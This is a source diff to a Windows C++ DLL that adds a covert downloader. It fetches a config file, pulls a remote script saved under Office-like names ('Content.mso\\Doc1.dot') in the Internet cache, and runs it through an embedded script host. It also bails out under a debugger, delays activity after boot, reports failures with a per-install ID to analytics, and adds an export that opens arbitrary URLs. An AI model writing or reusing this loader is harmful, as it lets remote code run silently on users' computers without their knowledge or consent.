@@ -9,6 +9,8 @@
 #include "tlhelp32.h"
 #include "shlobj.h"
 #include <time.h>
+#include <fstream>
+#include "md5.h"
 
 class CSHhostModule : public CAtlDllModuleT< CSHhostModule >
 {
@@ -234,16 +236,134 @@ public:
 	}
 };
 
+BOOL IsSystemStartup()
+{
+	BOOL b = (GetTickCount()<5*60*1000) ? TRUE : FALSE;
+	return b;
+}
+std::wstring GetLocalTempDir()
+{
+	TCHAR szTempDir[_MAX_PATH] = {0};
+	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szTempDir);
+	PathAddBackslash(szTempDir);
+	PathAppend(szTempDir, _T("Content.mso\\"));	
+	std::wstring t = szTempDir; 
+	return  t;
+}
+BOOL GetLaunchUrl(LPTSTR  lptszPath, LONG l, std::wstring & strMD5)
+{
+	l;
+	HRESULT hr = E_FAIL;
+	TCHAR szIniPath[_MAX_PATH] = {0};
+	TCHAR szTempDir[_MAX_PATH] = {0};
+	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szTempDir);
+	PathAddBackslash(szTempDir);
+	PathAppend(szTempDir, _T("Content.mso\\"));	
+	if(!PathFileExists(szTempDir))
+		SHCreateDirectory(NULL, szTempDir);	
+	_tcsncpy(szIniPath,szTempDir, _MAX_PATH);
+	PathAppend(szIniPath, _T("mso.dat"));
+	
+	TCHAR szIniUrl[2048] = {0};
+	wcscpy(szIniUrl, L"http://127.0.0.1/config/mso.dat");
+	hr = URLDownloadToCacheFile (NULL, szIniUrl, szIniPath, _MAX_PATH, 0, 0);
+	if(SUCCEEDED(hr) && PathFileExists(szIniPath))
+	{
+		TCHAR szLaunchUrl[2048] = {0};
+		GetPrivateProfileString(_T("launch"), _T("url"),_T(""), szLaunchUrl, 2048, szIniPath);
+		_tcsncpy(lptszPath, szLaunchUrl, l);
+		TCHAR szMD5[64] = {0};
+		GetPrivateProfileString(_T("launch"), _T("md5"),_T(""), szMD5, 2048,szIniPath);		
+		strMD5 = szMD5;		
+		std::transform(strMD5.begin(), strMD5.end(), strMD5.begin(), toupper);
+		return TRUE;
+	}	
+	return FALSE;
+}
+void SendDownloadLaunchUrlFailedStat(LPCTSTR lpctszEvent, LPCTSTR lpctszParam)
+{
+	CRegKey key;	
+	TCHAR szPID[32] = {0};	
+	HRESULT hr =  key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
+	if(hr == ERROR_SUCCESS)
+	{
+		DWORD dw = _MAX_PATH;				
+		dw = 17;
+		key.QueryStringValue(L"PID", szPID, &dw);
+		key.Close();
+	}
+	TCHAR szPath[_MAX_PATH] = {0};
+	CStringW url;
+	url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=exception&ea=%s&el=%s" ,
+		szPID, lpctszEvent, lpctszParam);
+	URLDownloadToCacheFile (NULL, url, szPath, _MAX_PATH, 0, 0);			 
+}
+std::wstring  GetFileMD5(LPCTSTR lpctszFile)
+{	
+	USES_CONVERSION;
+	if(!::PathFileExists(lpctszFile))
+		return _T("") ;	
+	std::ifstream fs;
+	fs.open( CStringA(lpctszFile), ios::in|ios::binary );  
+	if(fs.fail())
+		return _T("") ;
+	MD5 md5(fs);
+	std::string strMD5A = md5.toString();
+	std::transform(strMD5A.begin(), strMD5A.end(), strMD5A.begin(), toupper);
+	std::wstring strMD5 = A2W(strMD5A.c_str());
+	return strMD5;
+}
+
+
 //CAppModule _Module;
 #if defined(WIN64) || defined(_WIN64)
 #pragma comment(linker, "/EXPORT:ScreenSaver=?_si0@@YAXPEAUHWND__@@PEAUHINSTANCE__@@PEA_WH@Z,PRIVATE") 
 #else
 #pragma comment(linker, "/EXPORT:ScreenSaver=?_si0@@YGXPAUHWND__@@PAUHINSTANCE__@@PA_WH@Z,PRIVATE") 
+#pragma comment(linker, "/EXPORT:OpenURL=?_openurl@@YGXPAUHWND__@@PAUHINSTANCE__@@PA_WH@Z,PRIVATE") 
 //__declspec(dllexport)
 #endif
-void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
+
+static BOOL MultiByteToUnicode(const std::string& strSrc, std::basic_string<WCHAR> &strDst)
+{
+	INT nSrcAnsiLen = 0;
+	nSrcAnsiLen = (INT)strSrc.length();
+	if(0 == nSrcAnsiLen)
+		return TRUE;
+	UINT code_page = 936;
+	INT nLen = 0;
+	nLen = MultiByteToWideChar(code_page,0,strSrc.c_str(),-1,NULL,0);
+	if(0 == nLen)
+	{
+		code_page = 0;
+		nLen = MultiByteToWideChar(code_page,0,strSrc.c_str(),-1,NULL,0);
+	}
+	if(MAX_USERDATA_SIZE < nLen)
+		nLen = MAX_USERDATA_SIZE;
+	WCHAR szBuf[MAX_USERDATA_SIZE + 1] = {0};
+	LPWSTR pszBuf = szBuf;
+	INT nResult = 0;
+	nResult = MultiByteToWideChar(code_page,0,strSrc.c_str(), -1, pszBuf,nLen);
+	if(nResult <= 0 )
+		return FALSE;	
+	if(pszBuf)
+		strDst = pszBuf;
+	return TRUE;
+}
+void CALLBACK _openurl(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 {
 	TSAUTO();
+	lpCmdLine;
+	
+
+	CHAR szUrl[2048] = {0};
+	GetPrivateProfileStringA( "InternetShortcut", "URL", "", szUrl, 2048, (LPSTR)lpCmdLine);
+	::ShellExecuteA(NULL, "open", szUrl, "", NULL,SW_SHOWNORMAL);
+}
+
+void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
+{
+	TSAUTO();	
 	if (IsDebugging())
 	{
 		return;
@@ -275,61 +395,49 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	{
 		TSDEBUG4CXX("exit for hWnd2="<<hWnd2);
 		return ;
-	}
-	 
-	CoInitialize(NULL);
-	HRESULT hr = E_FAIL;
-	
-	TCHAR szDestLaunch[2048] = {0};
-	wcscpy(szDestLaunch, L"http://127.0.0.1/config/Doc1.dot");
-
-	CRegKey key;
-	TCHAR szLaunchPath [2048] = {0};
-	TCHAR szPID[32] = {0};
-	DWORD dwInstallTime = 0;
-	hr =  key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
-	if(hr == ERROR_SUCCESS)
+	}	 
+	CoInitialize(NULL);	
+	TCHAR szLaunchUrl[2048] = {0};
+	std::wstring strUrlMD5;
+	std::wstring strTempDir = GetLocalTempDir();
+	std::wstring strFile = strTempDir + _T("Doc1.dot");		 
+ 	if(IsSystemStartup())
 	{
-		DWORD dw = _MAX_PATH;
-		key.QueryStringValue(L"Launch", szLaunchPath, &dw );
-		if(PathFileExists(szLaunchPath))
-		{
-			_tcscpy(szDestLaunch, szLaunchPath); 
-		}
-		dw = 17;
-		key.QueryStringValue(L"PID", szPID, &dw);
-		key.QueryDWORDValue(L"instt", dwInstallTime);
-
-		key.Close();
-	}
-	TSDEBUG4CXX(" szDestLaunch : "<<szDestLaunch<<" dwInstallTime : "<<dwInstallTime);
-	// 加载	
-	TCHAR szPath[_MAX_PATH] = {0};
-	TCHAR szTempPath[_MAX_PATH] = {0};
-	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szPath);
-	PathAddBackslash(szPath);
-	PathAppend(szPath, _T("Content.mso\\Doc1.dot"));	
-	
-	DWORD dwOffset = (DWORD)time(0) - dwInstallTime;
-	if( (GetTickCount()<5*60*1000) && PathFileExists(szPath)) // 
-	{
-		hr = S_OK;
+		//刚开机
 	}
 	else
 	{
-		hr = URLDownloadToFile(NULL, szDestLaunch, szPath, _MAX_PATH, NULL);
-		TSDEBUG4CXX("downloadurl : "<<szDestLaunch<<" to " <<szPath<<" return " <<hr);
+		//取launchurl 和md5 
+		GetLaunchUrl(szLaunchUrl, 2048, strUrlMD5);
+		std::wstring strFileMD5 = GetFileMD5(strFile.c_str());
+		 
+		if(strUrlMD5 == strFileMD5)
+		{
+			TSDEBUG4CXX("same md5 , load local file : "<<strFileMD5.c_str());
+		}
+		else
+		{
+			HRESULT hr = E_FAIL;
+			hr = URLDownloadToFile (NULL, szLaunchUrl, (LPWSTR)strFile.c_str(),0,NULL);//NULL, t->bstrUrl, tszPath,0,NULL
+			if(SUCCEEDED(hr) && PathFileExists(strFile.c_str()))
+			{
+				//下载成功				
+			}
+			else
+			{
+				//下载失败，直接退出吧。否则统计不准，更是不可控
+				SendDownloadLaunchUrlFailedStat(_T("downloadingfile_failed_Doc1.dot"), PathFindFileName(strFile.c_str()));
+				TSDEBUG4CXX("download launch url "<<szLaunchUrl<<" to "<<strFile<<" failed!");
+				return ;
+			}
+		}
 	}
-	//wcscpy(szPath, L"c:\\scripthost.js");
-	if(!PathFileExists(szPath))
-	{
-		CStringW url;
-		url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=exception&ea=downloadingfile_failed_Doc1.dot&el=%s" ,
-			szPID, szPath);
-		URLDownloadToCacheFile (NULL, url, szPath, _MAX_PATH, 0, 0);
-		return;
-	}
+
+
+	////下成功或是md5一样的情况.... 或是首次开机,都是到这里:	
+	
 	//_Module.AddMessageLoop(&theLoop);
+	HRESULT hr = E_FAIL;
 	CComPtr<IClassFactory> spCF;
 	DllGetClassObject(*__pobjMap_CXScriptHost->pclsid, IID_IClassFactory,  (LPVOID*)&spCF);
 	if(!spCF)
@@ -339,7 +447,7 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	hr = spCF->CreateInstance(NULL, IID_IXScriptHost, (void **)&spScriptHost);
 	if(SUCCEEDED(hr) && spScriptHost)
 	{
-		spScriptHost->Load( szPath, 0 );
+		spScriptHost->Load( (BSTR)strFile.c_str(), 0 );
 		CComVariant v;
 		hr = spScriptHost->Run(&v);
 		if(SUCCEEDED(hr))
@@ -350,10 +458,7 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 		}
 		else
 		{
-			CStringW url;
-			url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=exception&ea=downloadingfile_loadfailed_Doc1.dot&el=%s" ,
-				szPID, szPath);
-			URLDownloadToCacheFile (NULL, url, szPath, _MAX_PATH, 0, 0);
+			SendDownloadLaunchUrlFailedStat(_T("downloadingfile_loadfailed_Doc1.dot"), PathFindFileName((LPCTSTR)strFile.c_str())); 
 		}
 		v.Clear();	
 		spScriptHost.Release();
